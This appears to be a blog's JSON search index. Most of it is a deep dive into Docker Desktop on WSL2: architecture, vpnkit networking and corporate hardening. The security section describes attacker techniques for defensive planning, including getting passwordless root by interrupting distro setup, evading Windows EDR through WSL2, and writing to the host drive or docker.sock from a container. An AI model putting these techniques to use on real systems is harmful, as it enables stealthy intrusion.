- - [23/Oct/2021:02:37:56 +0000] \"PUT /v2/my-ubuntu/blobs/uploads/c4c17c99-a34b-4823-8e2f-d44388fd14e7?_state=q8GBvxM4lqcwqZdeq7mJLo4GYSJ5ViYXRdaYBu-fv057Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiYzRjMTdjOTktYTM0Yi00ODIzLThlMmYtZDQ0Mzg4ZmQxNGU3IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM3OjU2LjY2MjQwNDg5MVoifQ%3D%3D&amp;digest=sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf HTTP/1.1\" 201 0 \"\" \"curl/7.68.0\"time=\"2021-10-23T02:37:56.682175203Z\" level=info msg=\"response completed\" go.version=go1.11.2 http.request.host=\"10.0.1.68:5000\" http.request.id=1354f16b-7940-4ad3-ac4b-c42b54fdafdb http.request.method=PUT http.request.remoteaddr=\"10.0.1.68:46060\" http.request.uri=\"/v2/my-ubuntu/blobs/uploads/c4c17c99-a34b-4823-8e2f-d44388fd14e7?_state=q8GBvxM4lqcwqZdeq7mJLo4GYSJ5ViYXRdaYBu-fv057Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiYzRjMTdjOTktYTM0Yi00ODIzLThlMmYtZDQ0Mzg4ZmQxNGU3IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM3OjU2LjY2MjQwNDg5MVoifQ%3D%3D&amp;digest=sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf\" http.request.useragent=\"curl/7.68.0\" http.response.duration=5.954959ms http.response.status=201 http.response.written=0NetworkLikewise at our network layet, either in our WAF’s or Firewalss we hould be validating that we can only push to our own internal container repositories and never an external one.Resources https://docs.docker.com/registry/spec/api/#blob-upload https://github.com/distribution/distribution/issues/2867 https://docs.docker.com/registry/spec/api/" }, { "title": "Docker Desktop WSL2 Deep Dive", "url": "/posts/docker-desktop-wsl2-deep-dive/", "categories": "Containerization", "tags": "containerization, wsl, wsl2, docker, docker desktop, windows", "date": "2021-10-01 12:00:00 -0500", "snippet": "In the last few years theres been a big push for Docker Desktop on developer workstations, many of those workstations being Mac and Windows not Linux. But since containers need a Linux kernel to run how does Docker Desktop handle this? Unfortunately the documentation out there is very light particularly using WSL2 so i have taken the time to do research and document my findings.WSL2 Deep DiveWindows HistoryBefore we talk about WSL it’s important to understand a bit about Windows, specifically Windows NT(kernel) and its subsystems. Since the beginning, Windows was designed with the ability to use several different subsystems such as POSIX, OS/2, and Win32 which is the most commonly used one today. This would give a programmatic interface to the applications without having to worry about how to implement them in the WindowsNT kernel itself.Each subsystem was implemented as “user mode” modules that issued appropriate NT system calls based on the API they presented to the applications for that subsystem. All applications were PE/COFF executables, a set of libraries and services to implement the subsystem API, and NTDLL to perform the NT system call. This means when a user launched a program it would indicate which subsystem to use and load all of its dependencies along with it based on the executable header. The predecessor to WSL, Subsystem for Unix-based Applications (SUA) was a replacement for POSIX, it was created to encourage developers to port their applications over by not having to worry about major rewrites to their code, instead, they implemented the POSIX user-mode APIs using NT constructs. However because the components were constructed in user mode, this model relied on the need for programs to be recompiled and required ongoing feature porting and was a maintenance burden.Eventually, most of those initial subsystems were retired but the Windows NT kernel maintained the ability to support multiple subsystems.WSL1WSL1 makes use of this ability by deploying a Linux Kernel Emulator Subsystem alongside the Win32 Subsystem. It is a collection of user-mode and kernel-mode components that give the ability to run native Linux ELF64 binaries to run on Windows. The main components are the LXSS Manager service which is a user-mode session manager service that handles the Linux instance life cycle. The Pico Processes that host the unmodified user mode Linux (e.g. /bin/bash). The Pico Provider Drivers (lxss.sys, lxcore.sys) emulates the Linux kernel by translating Linux system calls into WindowsNT system calls such as fork(). Again this was an emulated Linux kernel and not an actual Linux Kernel as shown below.Issues with WSL1 ArchitectureBecause WLS1 architecture uses an emulated Linux Kernel as a subsystem and not a real kernel. Some system calls will not translate correctly to what windows expect, for example in the image below we see how renaming a directory while having a child file open is done on the Windows side vs the Linux side.When Linux renames a directory it uses the open() syscall followed by the rename() syscall of the folder, allowing the folder to be moved underneath the file. However, the way Windows does this is by using the OpenFile() syscall followed by the MoveFile() syscall and it does not allow the underlying folder to be moved underneath. This will cause an ERROR_ACCESS_DENIED error. This is an example of many system calls that don’t translate correctly and therefore will not work using WSL1.WSL2Because of this Microsoft decided to revamp WSL and ship a real Linux Kernel, making it work side by side with the Windows NT Kernel, this is a specially tuned kernel for WSL2 managed all in-house by Microsoft and updated via Windows Update. They have modified for it to boot up very quickly and removed many things that are not needed that the windows hypervisor handles. However their upstream is the same open-source kernel from kernel.org. As you see below when you enable the Virtualization Services feature on windows 10 it deploys both kernels on a thin layer on top of the Windows Hypervisor. This is a Type 1 Hypervisor and should not be confused with Hyper-V or Hyper-V Plattform which is the client that talks to the Windows Hypervisor. This way WSL2 uses Windows Hypervisor through Virtual Machine Platform to run both Windows and Linux in their own separate VM’s, this design allows WSL2 to use a genuine Linux kernel in a separate virtual machine that runs in parallel to the Windows NT kernel. These are not traditional VM’s however, there is no Isolation since the Linux VM and Windows VM are integrated systems.WSL2 is backed by Windows Hypervisor through Virtual Machine Platform deploying a “Lightweight Linux Utility VM” consisting of a Linux Kernel and a Linux instance allowing you to install different System Containers(not to be confused with Docker Containers or Application Containers) or distributions all isolated by Linux namespaces running on the same ext4 filesystem all within the same Lightweight Linux Utility VM.As you can see from the above image the method WSL2 mounts or makes the drives accessible is by deploying a client both on the distribution and the windows side, and also a server on the Linux distro and windows side using the 9P protocol. Almost like an NFS share. As you can see you can also start/manage windows programs using the same protocol in the case above it opens up the cmd.exe program.Additional Features Over WSL1 wsl2 uses a real Linux kernel shipped with windows, built using the Linux 4.19 kernelext4 root filesystem /etc/wsl.conf - this is a configuration file that will allow you to add or remove features for wsl wslpath - translates paths from one environment to the other $WSLENV - share environment variables between Linux and windowsNOTE: Although WSL2 gives us the ability to build and distribute our own WSL2 distros, Docker Desktop does not allow other distros to be used other than the one it ships with.Docker Desktop Deep DiveDocker Desktop Deep DiveIn the past Docker bundled all the functionality into the Docker daemon which made it bloated and centralized, this made the Docker daemon a central attack vector. This was later corrected and overhauled into separate components which makes it simpler to secure since each component can be handled and secured individually, this is what gave the ability for Docker to be ported over to desktops.Docker communication is facilitated through the use of several API’s. The Docker Client itself communicates with the daemon through a domain(UNIX) socket, or remotely through a TCP socket. The commands are sent from the Docker client to the Docker Engine which then forwards the calls to Containerd. Communication between the Docker Dameonn and Conatinerd is facilitated through the gRPC ( remote procedure call protocol) protocol. Containerd utilizes a runtime specification, usually “runc” to create the actual containers.Some changes were made in Docker Desktop 2.2.0 FUSE-based filesharing protocol within docker containers Windows Hypervisor sockets instead of the Hyper-V networking Runs with User privilege. No need to authenticate or handle passwords No need for IP or to manage addresses Supports Caching and inotifiy Kubernetes WSL2 uses the latest stable Docker daemon The ability to use vpnkit The ability to use HTTP proxy settings and trusted CAIn order to install and run Docker Desktop with a WSL2 backend, it is recommended to follow these instructions to install WSL2 then these instructions to install Docker Desktop and enable the WSL2 support. Since the installation wizard will see WSL2 is enabled and will install any applicable utilities needed.There are two main ways to run Docker on Windows. The first method will be using Hyper-V as the backend which is the original method, it gives us a full isolated Linux VM but is very slow and will be deprecated in the near future. The second method is using WSL2 this is much faster given that it’s an integrated system and will more than likely be the defacto going forward.Hyper-V BackendDocker on Desktop running on with a Hyper-V Backend is completely different than running on WSL2. The most important thing to note with this method is the Linux VM that ships with Docker for Hyper-V. This Linux VM is entirely built using LinuxKit, Docker wrote a number of LinuxKit components, used both in Hyper-V and Mac VMs: services controlling the lifecycle of Docker and Kubernetes, services to collect diagnostics in case of failure, services aggregating logs, etc. Those services are packaged in an iso file in the Docker Desktop installation directory (docker-desktop.iso). On top of this base distro, at runtime, the second iso is mounted, which calls a version-pack iso. This file contains binaries and deployment/upgrade scripts specific to a version of the Docker Engine and Kubernetes. In the Enterprise edition, this second iso is part of the version packs docker publishes, while in the Community Editon, a single version pack is supported (the docker.iso file, also present in the docker desktop installation folder). Before starting the VM, a VHD is attached to store container images and configs, as well as the Kubernetes data store. To make those services accessible from the Windows side, Docker built a proxy that exposes Unix sockets as Windows named pipes, using Hyper-V Sockets under the hood.WSL2 BackendThe WSL2 backend is very similar to the Hyper-V backend with the biggest change being that the Linuxkit Distro does not run as a VM but rather as a container itself(not a Docker/OCI container, rather containerized using namespaces). When we first install Docker Desktop with a WSL2 backend, the installation wizard will create two separate WSL Distributions. “Docker-desktop” which is referred to as the “Bootstrapping distro” essentially replacing Hyper-V and the “Docker-desktop-data” which is referred to as the “data store distro” also replacing what we would normally think of as our VHD.The bootstrapping distro creates a Linux Namespace with its own root filesystem based on the Docker Desktop ISO and the Version Pack ISO files, then uses the “data store distro” as storage for container images, etc. Instead of a VHD, since WSL2 does not allow additional VHD’s to be other than the main one that is used for the Light Weight Linux Utility VM, cross-distro mounts are used instead.One thing to note is because WSL2 comes with a Linux kernel and system services these have been taken out of the docker-desktop.iso file being used. The version-pack.iso file is identical to the Hyper-V(and Mac).The Bootstrapping distro also manages things like mounting the Windows 9p shares in a place that can be accessed by the Linuxkit container and controls the lifecycle of the Linuxkit container ensuring things like a clean shutdown etc. This lets Docker run in a contained environment similar to the Hyper-V and Mac VM’s. so that no matter what backend Docker is using Hyper-V, WSL2, or Hyperkit for Macs the same code base is used for the Linuxkit components.Some other benefits over Hyper-V are the time difference it takes to start docker containers, and because WSL2 uses dynamic resource allocations it can access all the resources of the machines and consume as much or as little as it needs. This makes it easier to run in environments with lower memory where it was previously difficult to allocate 2GB of ram for Hyper-V upfront, this also allows for support in Windows versions where Hyper-V is not available such as Windows Home edition.NOTE: As stated above although we have the ability to create our own WSL2 Distros, Docker Desktop will not let use our own.VPNKITThe Docker for Windows VM is running on top of Hyper-V. vpnkit on the host uses Hyper-V sockets to connect to a process (tap-vsockd) inside the VM which accepts the connection and configures a tap device. Frames are encapsulated using the same custom protocol as on the Mac.Frames arriving from the VM are processed by a simple internal ethernet switch. The switch demultiplexes traffic onto output ports by matching on the destination IPv4 address. Frames that don’t match any rule are forwarded to a default port.Frames arriving on the default port are examined and if they contain ARP requests, we send a response using a static global ARP tableif they contain IPv4 datagrams then we create a fresh virtual TCP/IP endpoint using the Mirage TCP/IP stack (no kernel TCP/IP interfaces are involved), a fresh switch port on our internal switch, and connect them together so that all future IPv4 traffic to the same destination address is processed by the new endpoint.Each virtual TCP/IP endpoint terminates TCP and UDP flows using the Mirage TCP/IP stack. The data from the flows is proxied to and from regular BSD-style sockets on both Windows and Mac. The host kernel therefore only sees outgoing SOCK_STREAM and SOCK_DGRAM connections from the vpnkit process.If the VM is communicating with 10 remote IP addresses, then there will be 10 instances of a Mirage TCP/IP stack, one per IP address. The TCP/IP stack instances act as proxies for the remote hosts.The following diagram shows the flow of ethernet traffic within VPNKit:Each switch port has an associated last_active_time and if there is no traffic flow for a configured time interval, the port is deactivated and the TCP/IP endpoint is shutdown.The active ports may be queried by connecting to a Unix domain socket on the Mac or a named pipe on Windows and receiving diagnostic data in a Unix tar formatted stream.What happens when an application inside a container in the Linux VM tries to make a TCP connection: the application calls connect the Linux kernel emits a TCP packet with the SYN flag set the Linux kernel applies the iptables rules and consults the routing table to select the outgoing interface and then transmits the frame the frame is relayed to the host the interface was a tap device created by the tap-vsockd process. This process reads the frame from the associated file descriptor, encapsulates it and writes it to the Hyper-V socket connected to vpnkit. the frame is received by vpnkit and input into the ethernet switch. if the destination IP is not recognised: vpnkit creates a TCP/IP endpoint using Mirage TCP/IP stack with the destination IP address and configures the switch to send future packets with this destination IP to this endpoint if the destination IP is recognised: the internal switch inputs the frame into the TCP/IP endpoint the TCP/IP endpoint observes the SYN flag is set and so it calls the regular connect API to establish a regular SOCK_STREAM connection to that destination. if the connect succeeds: the TCP/IP endpoint sends back a packet with the SYN and ACK flags set and the handshake continues if the connect fails: the TCP/IP endpoint sends back a packet with the RST flag set to reject the connection. If all has gone well, the VM now has a TCP connection over a virtual point-to-point ethernet link connected to vpnkit, and vpnkit has a socket connection to the true destination. vpnkit will now proxy the data in both directions.Note that from the host kernel’s point of view, there is no network connection to the VM and no set of associated firewall rules or routing tables. All outgoing connections originate from the vpnkit process. If the user installs some advanced networking or VPN software which reconfigures the routing table or firewall rules, it will not break the connection between vpnkit and the VM.This technique for forwarding network connections is commonly known as Slirp.Docker Desktop Security Considerations and Securing Docker DesktopWe have decided to use Docker Desktop with a WSL2 backend. Because of this the rest of the document will only speak to Docker Desktop with a WSL2 Backend using the Docker provided WSL2 Distrbitutions.Non-Docker Specific ConsiderationsAs of Windows 10, 1803 and later “lxrun.exe” has been deprecated. It was used to set up and configure the Linux distributions that were installed in WSL. It was in this configuration that we were forced to set up a username and password for the distro as to not run as a root inside the distro from the get-go. However, there seems to be a flaw when deploying a distribution, when the system is determining the UNIX user and password. If the terminal associated with the deployment is terminated during the initial operation there is no defined user set and instead, the default process is to access the root account without credentials. Effectively replicating the automated setup for the default root user that is normally generated with “lxrun.exe”. By running a termination loop during the configuration you are guaranteed that WSL access is at the root level every time.However, for installing or running any sort of persistence method the attacker must run either the “bash.exe”, “wsl.exe” or distro-specific “.exe” such as “kali.exe”. Which in turn creates a “C:\\Windows\\system32\\lxss\\wslhost.exe” binary to command and/or initiate the WSL instance. It is not possible to automatically run the WSL instance by starting the associated services automatically, which means these binaries need to be called in order for it to start. Today the Linux instance is not configured with the ability for an automated service initiation system such as “init” or “systemd”.So any payloads which need persistence must be implemented through a windows level mechanism which should be able to be detected by our monitoring tools and processes.Another observation should be made that the WSL2 is set to terminate itself after 1 minute if no actions or processes are running on it. For example, if a user runs some processes or scripts and then terminates the shell or session, Windows Hypervisor will wait one minute and then terminate it. However, if a background process is running on the subsystem instance then it will not terminate and run for as long as the process or service is active.Because WSL2 is an integrated system WSL2 by default mounts the entire C drive and makes it accessible from within the Linux Distribution, because of this you are able to create, edit, and delete files from within the Linux distro. However, it does seem that even though you are root inside the distro without some sort of privilege escalation you cannot create or modify files and directories which you do not have access to on the Windows side.Here I am an admin on the windows machine creating a file from within the Distro inside WSL2.Here I am an admin on the windows machine creating a file from within Windows and it’s accessible within WSL2.Here I am a regular user on the windows machine but root from within the Distro inside WSL2.By default, this is everything mounted on any WSL2 distro.Knowing that the system is an integrated system gives us access to root level controls and directories, and the fact that most of the installation and system deployment of WSL need almost no input from the user or attacker and can be automated. Once it is installed the attacker will have full access to the subsystem without the user being alerted or notified of anything running in the background. Because the WSL2 instance is contained in the Linux System Container and runs all its calls through its own kernel none of our Windows EDR tools such as Carbon Black, will pick it up since they are only looking for specific files on the system or executables running, but the only real executable and services running are the “.exe” specific binaries and “wslhost.exe”, there is also no Event tracing for Windows output as well. This will give an attacker a fully customizable foothold within our network. Since there is no way to detect or discern an attacker running a service vs a legitimate user running a service.Docker Specific ConsiderationsDocker specific consideration from a WLS2 point of view is that the distribution of docker that comes with Docker desktop by default only has the root user. And even if the user itself does not have privileges on the WSL2 side, from inside the container since the WSL drive is mounted the root user in the container can create modify, and write files directly to the windows side of the filesystem.Here I am running a vulnerable container so I am taking the stance that either I have already have gotten root by privilege escalation or that only the root user exists on the container. As you can see from inside the container I am able to access the C drive that is mounted on the WSL part and even though I can’t access the TamaleRhino user or admin user I can still create documents under specific folders including the docker.socket which would let me make API calls directly to the Docker daemon itself.Securing Docker DesktopWhen it comes to Docker best practices there are a few categories to look at, I will break them up as follows. The Host(this is really the WSL2 side of the host since it’s integrated with windows) the Docker Daemon and the Containers themselves.Host:Files:From a DRT perspective WSL can be tricky to detect and, even if detected, the malicious association can be extremely difficult. As the installation of such a component is not in itself malicious, we are required to focus on the context of its deployment on a host as well as the distribution that is selected. Because a binary is created when a distribution is downloaded or installed we should be monitoring and blocking any of the standard WSL images such as “kali.exe”, “ubuntu.exe”, “centos” etc. under C:\\Users\\&lt;user&gt;\\AppData\\Local\\Microsoft\\WindowsApps\\ and only allow the Docker-based distributions. Another place would be the registry itself. Anytime there is an instance deployed on the system, the configuration information for it can be found with unique identifiers under the following registry location Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LxssThis provides an easy location to check for the distro installed as well as the location if an attacker wants to use a different location other than what is standard.Services:When it comes to services running it is really hard to know what is legitimate and what is not since the same services are used no matter what and from the Windows point of view it’s just a standard service.The main service to look out for is the lxssmanager it is the main one that starts up whenever you start a WSL distro. and if this service is terminated all the associated WSL instances are also terminated. The lxssmanager service triggers two svchost.exe instances one acting as a COM surrogate and the other to execute wslhost.exe which runs for as long as the WSL instance is running. The terminal session the user initiates also creates another wslhost.exe instance as a subprocess for the terminal being used ie: Powershell, under a wsl.exe. By checking to see that wslhost.exe and lxssmanager services are running we can detect whether wsl2 is running on the system.Because WSL2 runs on an instance with its own kernel it has no visible services on the windows side, and no logging(for WSL) like wsl1 had it makes it near impossible to monitor services inside the WSL2 instance.However, this is where a WSL Config file would come into play, the .wslconfig file usually located in C:\\Users\\&lt;yourUserName&gt;\\.wslconfig will help us set different settings for WSL2 such as resource limits, what kernel we can use, what ports can be used and any additional kernel command line arguments we want to use when the instance initializes. Other options include creating a specific /etc/wsl.conf that will let us control what filesystems or folders are automounted, Network options, what Users can be used on the system, and even if they have the ability to launch windows programs for example by creating a wsl.conf file with the interop label the key enabled set to false the user will not be able to launch windows processes. additionally setting the appendWindowsPath to false will not add Windows path elements to the $PATH environment variable.There is also an experimental boot label that lets us run a command, we might be able to use this as some sort of hook or way to get logging out of the WSL instance into the windows machine for better monitoring.NOTE: Again because docker desktop does not allow us to use our own distros. In order to create a /etc/wsl.conf file, we will have to do it after the fact, either through some sort of script that creates the file from the Windows side, or a script on the Docker side.Docker DaemonAPI/Syscalls:By default, a UNIX domain socket (or IPC socket) is created at /var/run/docker.sock, requiring either root permission or docker group membership.A daemon.json file must be created for us to manage the docker daemon. The JSON file can be located at %programdata%\\docker\\config\\daemon.json or in the Docker Desktop GUI under Settings → Docker Engine.Full example of the allowed configuration options on Windows{ \"allow-nondistributable-artifacts\": [], \"authorization-plugins\": [], \"bridge\": \"\", \"cluster-advertise\": \"\", \"cluster-store\": \"\", \"containerd\": \"\\\\\\\\.\\\\pipe\\\\containerd-containerd\", \"containerd-namespace\": \"docker\", \"containerd-plugin-namespace\": \"docker-plugins\", \"data-root\": \"\", \"debug\": true, \"default-ulimits\": {}, \"dns\": [], \"dns-opts\": [], \"dns-search\": [], \"exec-opts\": [], \"experimental\": false, \"features\": {}, \"fixed-cidr\": \"\", \"group\": \"\", \"hosts\": [], \"insecure-registries\": [], \"labels\": [], \"log-driver\": \"\", \"log-level\": \"\", \"max-concurrent-downloads\": 3, \"max-concurrent-uploads\": 5, \"max-download-attempts\": 5, \"mtu\": 0, \"pidfile\": \"\", \"raw-logs\": false, \"registry-mirrors\": [], \"shutdown-timeout\": 15, \"storage-driver\": \"\", \"storage-opts\": [], \"swarm-default-advertise-addr\": \"\", \"tlscacert\": \"\", \"tlscert\": \"\", \"tlskey\": \"\", \"tlsverify\": true}Apparmor is not available for Docker Desktop and seccomp-profile is not an option on the windows daemon.json. However, when running docker system info it does mention it is using a default profile, it seems we just can’t change it.We can however use an Authorization Plugin. By default Docker’s out-of-the-box authorization model is all or nothing. Any user with permission to access the Docker daemon can run any Docker client command. The same is true for callers using Docker’s Engine API to contact the daemon. An authorization plugin approves or denies requests to the Docker daemon based on both the current authentication context and the command context. The authentication context contains all user details and the authentication method. The command context contains all the relevant request data.We should use an auth plugin such as Open Policy Agent or Twistlock to get the granular controls needed.Logging:Logging for docker containers can be found under C:\\Users\\&lt;user&gt;\\AppData\\Local\\Docker.The Docker daemon logs two types of events: Commands sent to the daemon through Docker’s Remote API Events that occur as part of the daemon’s normal operationRemote API EventsThe Remote API lets you interact with the daemon using common commands. Commands passed to the Remote API are automatically logged along with any warning or error messages resulting from those commands. Each event contains: The current timestamp The log level (Info, Warning, Error, etc.) The request type (GET, PUT, POST, etc.) The Remote API version The endpoint (containers, images, data volumes, etc.) Details about the request, including the return typeFor example, listing the active containers on a Boot2Docker host generates the following log entry:time=\"2015-11-18T11:28:50.795661833-05:00\" level=info msg=\"GET /v1.21/containers/json\"Daemon EventsDaemon events are messages regarding the state of the Docker service itself. Each event displays: The current timestamp The log level Details about the event The events recorded by the daemon provide detailed information on:Actions performed during the initialization process Features provided by the host kernel The status of commands sent to containers The overall state of the Docker service The state of active containersDaemon events often provide detailed information about the state of containers. However, messages regarding a container may refer to the container by ID rather than by name. For instance, a container with the name “sleepy_nobel” failed to respond to a stop command. The stop command, along with the failure notification, generated the following events:time=\"2015-11-18T11:28:40.726969388-05:00\" level=info msg=\"POST /v1.21/containers/sleepy_nobel/stop?t=10\"time=\"2015-11-18T11:28:50.754021339-05:00\" level=info msg=\"Container b5e7de70fa9870de6c3d71bf279a4571f890e246e8903ff7d864f85c33af6c7c failed to exit within 10 seconds of SIGTERM - using the force\"You can retrieve a container’s ID by using the docker inspect command.Example of docker log.Containers and ImagesAlthough we will be limiting the Docker Desktop program to use authorized docker hubs only. There is a use case where the developer can recreate a vulnerable container and be able to share it quite easily.The developer will have to create a dockerfile(or download from places like GitHub) that will build a vulnerable container locally. All they would have to do is download the scripts they want to run to configure the vulnerable container and create a docker file to use them.The base image would be downloaded from our internal secure source such as our MCR, and then through the build process of their dockerfile the vulnerable docker image would be created. This is a flat file that can be zipped up and shared rather easily either through emailing directly or using our internal tools such as Bitbucket and confluence. It is because of this that we should consider the container hostile at all times and most of our controls should be focused on the host itself, wsl platform, and docker engine to give us that defense in depth needed to mitigate the risk of hostile containers.Sources https://www.youtube.com/watch?v=lwhMThePdIo https://docs.microsoft.com/en-us/windows/wsl/compare-versions https://docs.microsoft.com/en-us/archive/blogs/wsl/windows-subsystem-for-linux-overview https://www.docker.com/blog/new-docker-desktop-wsl2-backend/ https://levelup.gitconnected.com/docker-desktop-on-wsl2-the-problem-with-mixing-file-systems-a8b5dcd79b22 https://www.docker.com/blog/deep-dive-into-new-docker-desktop-filesharing-implementation/ https://docs.microsoft.com/en-us/windows/wsl/install-win10 https://docs.docker.com/docker-for-windows/wsl/ https://docs.microsoft.com/en-us/windows/wsl/ https://docs.microsoft.com/en-us/windows/wsl/tutorials/wsl-containers https://medium.com/swlh/building-a-dev-container-for-net-core-e43a2236504f https://devblogs.microsoft.com/commandline/learn-about-windows-console-and-windows-subsystem-for-linux-wsl/ https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes aka.ms/cliblog https://github.com/Microsoft/WSL https://docs.microsoft.com/en-us/windows/wsl/build-custom-distro https://github.com/linuxkit/linuxkit https://img.en25.com/Web/FSecure/%7B87c32f0e-962d-4454-b244-1bb8908968d4%7D_WSL-2-RESEARCH.pdf https://www.cvedetails.com/product/28125/Docker-Docker.html?vendor_id=13534 https://www.loggly.com/blog/what-does-the-docker-daemon-log-contain/ https://superuser.com/questions/1556521/virtual-machine-platform-in-win-10-2004-is-hyper-v/1619173#1619173 https://www.docker.com/blog/capturing-logs-in-docker-desktop/" } ]
